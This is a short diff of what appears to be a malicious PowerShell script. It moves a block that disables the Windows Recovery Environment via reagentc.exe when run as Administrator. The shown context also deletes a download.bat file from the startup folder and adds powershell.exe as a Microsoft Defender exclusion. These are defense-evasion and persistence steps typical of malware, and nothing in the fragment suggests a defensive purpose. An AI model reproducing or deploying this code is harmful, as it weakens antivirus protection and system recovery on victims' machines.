@@ -54,11 +54,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     }
 }
 
-if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    reagentc.exe /disable
-} else {
-    echo "Not running as Admin"
-}
+
 
 Remove-Item -Path "$startupfolder\download.bat" -Force
 Add-MpPreference -ExclusionProcess "powershell.exe"
@@ -158,3 +154,8 @@ foreach ($path in $discPaths) {
 }
 
 
+if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    reagentc.exe /disable
+} else {
+    echo "Not running as Admin"
+}
